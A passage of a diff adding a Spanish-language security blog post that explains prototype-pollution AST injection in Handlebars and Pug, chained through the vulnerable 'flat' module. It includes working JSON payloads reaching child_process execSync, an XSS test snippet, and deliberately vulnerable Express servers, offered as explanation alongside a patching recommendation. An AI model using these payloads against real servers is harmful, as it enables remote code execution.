+    <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">yy</span>.<span style="color:#a6e22e">SourceLocation</span>(<span style="color:#a6e22e">options</span> <span style="color:#f92672">&amp;&amp;</span> <span style="color:#a6e22e">options</span>.<span style="color:#a6e22e">srcName</span>, <span style="color:#a6e22e">locInfo</span>);
+  };
+
+  <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">ast</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">_parser2</span>[<span style="color:#e6db74">&#39;default&#39;</span>].<span style="color:#a6e22e">parse</span>(<span style="color:#a6e22e">input</span>);
+
+  <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">ast</span>;
+}
+
+<span style="color:#66d9ef">function</span> <span style="color:#a6e22e">parse</span>(<span style="color:#a6e22e">input</span>, <span style="color:#a6e22e">options</span>) {
+  <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">ast</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">parseWithoutProcessing</span>(<span style="color:#a6e22e">input</span>, <span style="color:#a6e22e">options</span>);
+  <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">strip</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">_whitespaceControl2</span>[<span style="color:#e6db74">&#39;default&#39;</span>](<span style="color:#a6e22e">options</span>);
+
+  <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">strip</span>.<span style="color:#a6e22e">accept</span>(<span style="color:#a6e22e">ast</span>);
+}
+</code></pre></div><p>Podemos observar como la función <code>parseWithoutProcessing</code> Acepta dos tipos de para <code>input</code>, los quales pueden ser de tipo <code>Program</code> y <code>template string</code>. cuando <code>input.type</code> es <code>Program</code> este directamente se envia al compilador sin hacer ninguna comprobación de mas, aunque este sea de otro tipo como podria ser un string.</p>
+<p>El codigo que veremos a continuación corresponde al compilador de handlebars:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-js" data-lang="js"><span style="color:#960050;background-color:#1e0010">/node_modules/handlebars/dist/cjs/handlebars/compiler/compiler.js</span>
+...
+<span style="color:#a6e22e">accept</span><span style="color:#f92672">:</span> <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">accept</span>(<span style="color:#a6e22e">node</span>) {
+    <span style="color:#75715e">/* istanbul ignore next: Sanity code */</span>
+    <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span><span style="color:#66d9ef">this</span>[<span style="color:#a6e22e">node</span>.<span style="color:#a6e22e">type</span>]) {
+        <span style="color:#66d9ef">throw</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">_exception2</span>[<span style="color:#e6db74">&#39;default&#39;</span>](<span style="color:#e6db74">&#39;Unknown type: &#39;</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">node</span>.<span style="color:#a6e22e">type</span>, <span style="color:#a6e22e">node</span>);
+    }
+
+    <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">sourceNode</span>.<span style="color:#a6e22e">unshift</span>(<span style="color:#a6e22e">node</span>);
+    <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">ret</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">this</span>[<span style="color:#a6e22e">node</span>.<span style="color:#a6e22e">type</span>](<span style="color:#a6e22e">node</span>);
+    <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">sourceNode</span>.<span style="color:#a6e22e">shift</span>();
+    <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">ret</span>;
+},
+<span style="color:#a6e22e">Program</span><span style="color:#f92672">:</span> <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">Program</span>(<span style="color:#a6e22e">program</span>) {
+    <span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>((<span style="color:#66d9ef">new</span> Error).<span style="color:#a6e22e">stack</span>)
+    <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">options</span>.<span style="color:#a6e22e">blockParams</span>.<span style="color:#a6e22e">unshift</span>(<span style="color:#a6e22e">program</span>.<span style="color:#a6e22e">blockParams</span>);
+
+    <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">body</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">program</span>.<span style="color:#a6e22e">body</span>,
+        <span style="color:#a6e22e">bodyLength</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">body</span>.<span style="color:#a6e22e">length</span>;
+    <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">var</span> <span style="color:#a6e22e">i</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; <span style="color:#a6e22e">i</span> <span style="color:#f92672">&lt;</span> <span style="color:#a6e22e">bodyLength</span>; <span style="color:#a6e22e">i</span><span style="color:#f92672">++</span>) {
+        <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">accept</span>(<span style="color:#a6e22e">body</span>[<span style="color:#a6e22e">i</span>]);
+    }
+
+    <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">options</span>.<span style="color:#a6e22e">blockParams</span>.<span style="color:#a6e22e">shift</span>();
+
+    <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">isSimple</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">bodyLength</span> <span style="color:#f92672">===</span> <span style="color:#ae81ff">1</span>;
+    <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">blockParams</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">program</span>.<span style="color:#a6e22e">blockParams</span> <span style="color:#f92672">?</span> <span style="color:#a6e22e">program</span>.<span style="color:#a6e22e">blockParams</span>.<span style="color:#a6e22e">length</span> <span style="color:#f92672">:</span> <span style="color:#ae81ff">0</span>;
+
+    <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">this</span>;
+}
+...
+</code></pre></div><p>Cuando el compilador recive un Objeto AST este es enviado a la funcion <code>accept</code> donde comprueba el tipo si es un tipo esperado, en caso de que no lo sea lanza una excepcion pero en caso que sea un tipo esperado el programa avanza. Posteriormente en la funcion Program recoge el atributo body del AST i lo utiliza para crear una function. Por lo que nosotros podremos inyectar cualquier codigo si vamos a traves del parser. Para hacerlo tendremos que assignar un string que no puede ser assignado como valor al tipo NumberLiteral. Pero como el AST inyectado procede, el codigo se ejecutarà. Por lo que podriamos hacer algo como:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-json" data-lang="json">{
+    <span style="color:#f92672">&#34;__proto__.type&#34;</span>: <span style="color:#e6db74">&#34;Program&#34;</span>,
+    <span style="color:#f92672">&#34;__proto__.body&#34;</span>: [{
+        <span style="color:#f92672">&#34;type&#34;</span>: <span style="color:#e6db74">&#34;MustacheStatement&#34;</span>,
+        <span style="color:#f92672">&#34;path&#34;</span>: <span style="color:#ae81ff">0</span>,
+        <span style="color:#f92672">&#34;params&#34;</span>: [{
+            <span style="color:#f92672">&#34;type&#34;</span>: <span style="color:#e6db74">&#34;NumberLiteral&#34;</span>,
+            <span style="color:#f92672">&#34;value&#34;</span>: <span style="color:#e6db74">&#34;process.mainModule.
+</span><span style="color:#e6db74">                        require(&#39;child_process&#39;).
+</span><span style="color:#e6db74">                            execSync(`fsutil file createnew prova1.txt 2000`)&#34;</span>
+        }],
+        <span style="color:#f92672">&#34;loc&#34;</span>: {
+            <span style="color:#f92672">&#34;start&#34;</span>: <span style="color:#ae81ff">0</span>,
+            <span style="color:#f92672">&#34;end&#34;</span>: <span style="color:#ae81ff">0</span>
+        }
+    }]
+}
+</code></pre></div><p>Podemos observar que esta peticion lo que pretende es contaminar los objectos con los campos type y body con los campos especificos para que al ejectutar la funcion compile de modulo de handlevasr nos permita ejecutar codigo remoto. Para que esto sea efectivo voy a mostrar una pequeña muestra de como tendria que funcionar el servidor para que esto ocurriese.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-js" data-lang="js"><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">express</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">require</span>(<span style="color:#e6db74">&#39;express&#39;</span>);
+<span style="color:#66d9ef">const</span> <span style="color:#a6e22e">unflatten</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">require</span>(<span style="color:#e6db74">&#39;flat&#39;</span>).<span style="color:#a6e22e">unflatten</span>;
+<span style="color:#66d9ef">const</span> <span style="color:#a6e22e">bodyParser</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">require</span>(<span style="color:#e6db74">&#39;body-parser&#39;</span>);
+<span style="color:#66d9ef">const</span> <span style="color:#a6e22e">Handlebars</span>  <span style="color:#f92672">=</span> <span style="color:#a6e22e">require</span>(<span style="color:#e6db74">&#39;handlebars&#39;</span>);
+
+<span style="color:#66d9ef">const</span> <span style="color:#a6e22e">app</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">express</span>();
+<span style="color:#a6e22e">app</span>.<span style="color:#a6e22e">use</span>(<span style="color:#a6e22e">bodyParser</span>.<span style="color:#a6e22e">json</span>())
+
+<span style="color:#a6e22e">app</span>.<span style="color:#a6e22e">get</span>(<span style="color:#e6db74">&#39;/&#39;</span>, <span style="color:#66d9ef">function</span> (<span style="color:#a6e22e">req</span>, <span style="color:#a6e22e">res</span>) {
+    <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">source</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&lt;h1&gt;La pagina esta funcionant!&lt;/h1&gt;&#34;</span>;
+
+    <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">template</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">Handlebars</span>.<span style="color:#a6e22e">compile</span>(<span style="color:#a6e22e">source</span>);
+    <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">end</span>(<span style="color:#a6e22e">template</span>({}));
+});
+
+<span style="color:#a6e22e">app</span>.<span style="color:#a6e22e">post</span>(<span style="color:#e6db74">&#39;/vulnerable&#39;</span>, <span style="color:#66d9ef">function</span> (<span style="color:#a6e22e">req</span>, <span style="color:#a6e22e">res</span>) {
+
+    <span style="color:#66d9ef">let</span> <span style="color:#a6e22e">object</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">unflatten</span>(<span style="color:#a6e22e">req</span>.<span style="color:#a6e22e">body</span>);
+    <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">json</span>(<span style="color:#a6e22e">object</span>);
+
+});
+
+<span style="color:#a6e22e">app</span>.<span style="color:#a6e22e">listen</span>(<span style="color:#ae81ff">3000</span>);
+</code></pre></div><p>El servidor web usa <code>express</code> ademas de otros modulos donde hace falta destacar <code>flat</code>. En versiones anteriores de flat hay una vulnerabilidad que permita la contaminación del objeto prototype. La falla se encuentra en la función unflatten donde en este caso processa los campos recividos por la petición post sin prèvia validación. En caso de que ser reciva los campos expuestos anteriormente va a provocar que todo el programa se contamine. Para ver mas información sobre las versiones vulnerables pudes pulsar <a href="https://security.snyk.io/vuln/SNYK-JS-FLAT-596927">aqui</a>).Por ende si posteriormente se hace una petición get para mostrar la pàgina, handlebars va a ejecutar la función <code>compile(source)</code> lo que va a causar que se ejecute codigo remoto. En este caso creará un documento en la carpeta del servidor. Puedes ver las versiones afectadas de handlebars <a href="https://security.snyk.io/vuln/SNYK-JS-HANDLEBARS-1279029">aqui</a> <a href="https://security.snyk.io/vuln/SNYK-JS-FLAT-596927">[ 6 ]</a><a href="https://security.snyk.io/vuln/SNYK-JS-HANDLEBARS-1279029">[ 7 ]</a>.</p>
+<p>Con la ejecución de codigo remoto que se consigue se puede ver claramente el nivel de peligrosidad que se puede crear. Dando la possiblidad de ejecutar cualquier tipo de comando en el servidor. Como se ha dicho previamente la mejor solución para este fallo de seguridad es actualizar ambos modulos a una version actual<a href="https://blog.p6.is/AST-Injection/#Exploit">[ 8 ]</a>.</p>
+<h1 id="pug">
+  Pug
+  <a class="heading-link" href="#pug">
+    <i class="fa fa-link" aria-hidden="true"></i>
+  </a>
+</h1>
+<p>Pug es un modulo de nodejs el qual a través de la función <code>pug.compile()</code> permite compilar el codigo fuente de Pug a una función Javascript que coje un objeto de datos nombrado <code>locals</code> como argumento. En resumen es un motor de plantilla con el que eres capaz de escrivir codigo html con una sintaxis mas senzilla. Puedes encontrar más información al respecto <a href="https://pugjs.org/api/getting-started.html">aquí</a>.</p>
+<p>Versiones anteriores a este modulo tambien disponen de errores importantes que nos permiten la ejecución de codigo remoto. Para poder comprobar si tu sitio web es vulnerable a este se puede hacer uso del siguiente codigo:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-js" data-lang="js"><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">pug</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">require</span>(<span style="color:#e6db74">&#39;pug&#39;</span>);
+
+Object.<span style="color:#a6e22e">prototype</span>.<span style="color:#a6e22e">block</span> <span style="color:#f92672">=</span> {<span style="color:#e6db74">&#34;type&#34;</span><span style="color:#f92672">:</span><span style="color:#e6db74">&#34;Text&#34;</span>,<span style="color:#e6db74">&#34;val&#34;</span><span style="color:#f92672">:</span><span style="color:#e6db74">`&lt;script&gt;alert(origin)&lt;/script&gt;`</span>};
+
+<span style="color:#66d9ef">const</span> <span style="color:#a6e22e">source</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">`h1= msg`</span>;
+
+<span style="color:#66d9ef">var</span> <span style="color:#a6e22e">fn</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">pug</span>.<span style="color:#a6e22e">compile</span>(<span style="color:#a6e22e">source</span>, {});
+<span style="color:#66d9ef">var</span> <span style="color:#a6e22e">html</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">fn</span>({<span style="color:#a6e22e">msg</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#39;It works&#39;</span>});
+
+<span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#a6e22e">html</span>);
+</code></pre></div><p>En caso que nuestra versión sea vulnerable si contaminamos el objeto prototype con nuevo objeto nombrado <code>block</code> el codigo que contenga (AST) el compilador lo añade al buffer haciendo referencia a val. Podemos observar las siguientes lineas de código.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-js" data-lang="js"><span style="color:#66d9ef">switch</span> (<span style="color:#a6e22e">ast</span>.<span style="color:#a6e22e">type</span>) {
+    <span style="color:#66d9ef">case</span> <span style="color:#e6db74">&#39;NamedBlock&#39;</span><span style="color:#f92672">:</span>
+    <span style="color:#66d9ef">case</span> <span style="color:#e6db74">&#39;Block&#39;</span><span style="color:#f92672">:</span>
+        <span style="color:#a6e22e">ast</span>.<span style="color:#a6e22e">nodes</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">walkAndMergeNodes</span>(<span style="color:#a6e22e">ast</span>.<span style="color:#a6e22e">nodes</span>);
+        <span style="color:#66d9ef">break</span>;
+    <span style="color:#66d9ef">case</span> <span style="color:#e6db74">&#39;Case&#39;</span><span style="color:#f92672">:</span>
+    <span style="color:#66d9ef">case</span> <span style="color:#e6db74">&#39;Filter&#39;</span><span style="color:#f92672">:</span>
+    <span style="color:#66d9ef">case</span> <span style="color:#e6db74">&#39;Mixin&#39;</span><span style="color:#f92672">:</span>
+    <span style="color:#66d9ef">case</span> <span style="color:#e6db74">&#39;Tag&#39;</span><span style="color:#f92672">:</span>
+    <span style="color:#66d9ef">case</span> <span style="color:#e6db74">&#39;InterpolatedTag&#39;</span><span style="color:#f92672">:</span>
+    <span style="color:#66d9ef">case</span> <span style="color:#e6db74">&#39;When&#39;</span><span style="color:#f92672">:</span>
+    <span style="color:#66d9ef">case</span> <span style="color:#e6db74">&#39;Code&#39;</span><span style="color:#f92672">:</span>
+    <span style="color:#66d9ef">case</span> <span style="color:#e6db74">&#39;While&#39;</span><span style="color:#f92672">:</span>
+        <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">ast</span>.<span style="color:#a6e22e">block</span>) {
+        <span style="color:#a6e22e">ast</span>.<span style="color:#a6e22e">block</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">walkAST</span>(<span style="color:#a6e22e">ast</span>.<span style="color:#a6e22e">block</span>, <span style="color:#a6e22e">before</span>, <span style="color:#a6e22e">after</span>, <span style="color:#a6e22e">options</span>);
+        }
+        <span style="color:#66d9ef">break</span>;
+    ...
+</code></pre></div><p>Cuando <code>ast.type</code> és cualquiel valor desde <code>case</code> hasta <code>While</code>, llama a la función walkAST la qual passa como parametro <code>ast.block</code> el qual hace referencia al objeto prototype si este no esta definido. El detalle està en que si la plantilla hace referencia a cualquier valor de los argumenteos, el nodo While siempre va a existir. Es decir que siempre estaran definidos en la plantilla, ya que si no necessita hacer referencia de ninguno de estos valores no necessitaria i/o deberia usar este modulo o cualquier otro de templates engines.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-js" data-lang="js"><span style="color:#960050;background-color:#1e0010">/node_modules/pug-code-gen/index.js</span>
+
+<span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">debug</span> <span style="color:#f92672">&amp;&amp;</span> <span style="color:#a6e22e">node</span>.<span style="color:#a6e22e">debug</span> <span style="color:#f92672">!==</span> <span style="color:#66d9ef">false</span> <span style="color:#f92672">&amp;&amp;</span> <span style="color:#a6e22e">node</span>.<span style="color:#a6e22e">type</span> <span style="color:#f92672">!==</span> <span style="color:#e6db74">&#39;Block&#39;</span>) {
+    <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">node</span>.<span style="color:#a6e22e">line</span>) {
+        <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">js</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;;pug_debug_line = &#39;</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">node</span>.<span style="color:#a6e22e">line</span>;
+        <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">node</span>.<span style="color:#a6e22e">filename</span>)
+            <span style="color:#a6e22e">js</span> <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#39;;pug_debug_filename = &#39;</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">stringify</span>(<span style="color:#a6e22e">node</span>.<span style="color:#a6e22e">filename</span>);
+        <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">buf</span>.<span style="color:#a6e22e">push</span>(<span style="color:#a6e22e">js</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;;&#39;</span>);
+    }
+}
+</code></pre></div><p>En este fragmento de codigo podemos observar que la variable <code>pug_debug_line</code> guarda el valor del la linea del nodo i posteriormente se añade en el buffer. Anteriormente se hace la comprovación de que este valor exista para ser añadido, pero lo interesante és que todos los AST que se generan a partir del parser de pug ya tienen la linea especificada. Por lo que podemos preguntar: ¿Que passaria si en vez de poner un numero introducimos una cadena? ¡Exacto! esta cadena se guarda en el buffer.</p>
+<p>Por lo que si tenemos en cuenta los que hemos dicho anteriormente de que si tenemos la referencia de alguno de los argumentos en la template si o si se va a generar el nodo While, por lo que se va a ejecutar la línea walkAST y que esta va a usar el valor del objeto prototype si no esta definido y que posteriormente también se va a ejecutar la linea de codigo anterior donde se añadia el valor de <code>line</code> en el buffer. Entonces si contaminamos el programa con un objeto prototype con valores <code>block</code> y <code>line</code> concretos podemos llegar a ejecutar codigo remoto. Vamos a ver:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-js" data-lang="js">{
+    <span style="color:#e6db74">&#34;__proto__.block&#34;</span><span style="color:#f92672">:</span> {
+        <span style="color:#e6db74">&#34;type&#34;</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;Text&#34;</span>,
+        <span style="color:#e6db74">&#34;line&#34;</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;console.log(&#39;Buenos dias, quiero macarrones.&#39;);&#34;</span>
+    }
+}
+</code></pre></div><p>Si conseguimos de alguna forma contaminar el programa con estos datos y tenemos en cuenta lo que hemos dicho anteriormente, conseguiremos escribir en la consola del servidor donde este alojado el programa la frase: &ldquo;Buenos dias, quiero macarrones&rdquo;. Para poder hacer un ejemplo podemos utilizar el codigo anterior y hacer uso del modulo <code>flat</code> el cual tiene una vulnerabilidad que permite hacer contaminación prototype.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-js" data-lang="js"><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">express</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">require</span>(<span style="color:#e6db74">&#39;express&#39;</span>);
+<span style="color:#66d9ef">const</span> <span style="color:#a6e22e">unflatten</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">require</span>(<span style="color:#e6db74">&#39;flat&#39;</span>).<span style="color:#a6e22e">unflatten</span>;
+<span style="color:#66d9ef">const</span> <span style="color:#a6e22e">bodyParser</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">require</span>(<span style="color:#e6db74">&#39;body-parser&#39;</span>);
+<span style="color:#66d9ef">const</span> <span style="color:#a6e22e">pug</span>  <span style="color:#f92672">=</span> <span style="color:#a6e22e">require</span>(<span style="color:#e6db74">&#39;pug&#39;</span>);
+
+<span style="color:#66d9ef">const</span> <span style="color:#a6e22e">app</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">express</span>();
+<span style="color:#a6e22e">app</span>.<span style="color:#a6e22e">use</span>(<span style="color:#a6e22e">bodyParser</span>.<span style="color:#a6e22e">json</span>())
+
+<span style="color:#a6e22e">app</span>.<span style="color:#a6e22e">get</span>(<span style="color:#e6db74">&#39;/&#39;</span>, <span style="color:#66d9ef">function</span> (<span style="color:#a6e22e">req</span>, <span style="color:#a6e22e">res</span>) {
+    <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">source</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;La pagina esta funcionant!&#34;</span>;
+    <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">template</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">pug</span>.<span style="color:#a6e22e">compile</span>(<span style="color:#e6db74">`h1= msg`</span>);
+    <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">end</span>(<span style="color:#a6e22e">template</span>({<span style="color:#a6e22e">msg</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">source</span>}));
+});
+
+<span style="color:#a6e22e">app</span>.<span style="color:#a6e22e">post</span>(<span style="color:#e6db74">&#39;/vulnerable&#39;</span>, <span style="color:#66d9ef">function</span> (<span style="color:#a6e22e">req</span>, <span style="color:#a6e22e">res</span>) {
+
+    <span style="color:#66d9ef">let</span> <span style="color:#a6e22e">object</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">unflatten</span>(<span style="color:#a6e22e">req</span>.<span style="color:#a6e22e">body</span>);
+    <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">json</span>(<span style="color:#a6e22e">object</span>);
+
+});
+
+<span style="color:#a6e22e">app</span>.<span style="color:#a6e22e">listen</span>(<span style="color:#ae81ff">3000</span>);
+</code></pre></div><h1 id="referencias">
+  Referencias
+  <a class="heading-link" href="#referencias">
+    <i class="fa fa-link" aria-hidden="true"></i>
+  </a>
+</h1>
+<p>[ 1 ]</p>
+<p>[ 2 ]</p>
+<p>[ 3 ]</p>
+<p>[ 4 ]</p>
+<p>[ 5 ]</p>
+<p>[ 6 ]</p>
+<p>[ 7 ]</p>
+<p>[ 8 ]</p>
+
+      </div>
+
+
+      <footer>
+        
+
+
+        
+        
+        
+      </footer>
+    </article>
+
+    
+  </section>
+
+      </div>
+
+      <footer class="footer">
+  <section class="container">
+    ©
+    
+      2021 -
+    
+    2022
+     LeVarez 
+    ·
+    Desarrollado por <a href="https://gohugo.io/">Hugo</a> & <a href="https://github.com/luizdepra/hugo-coder/">Coder</a>.
+    
+  </section>
+</footer>
+
+    </main>
+
+    
+      
+      <script src="/js/coder.min.03b17769f4f91ae35667e1f2a1ca8c16f50562576cf90ff32b3179926914daa5.js" integrity="sha256-A7F3afT5GuNWZ&#43;HyocqMFvUFYlds&#43;Q/zKzF5kmkU2qU="></script>
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+  </body>
+
+</html>
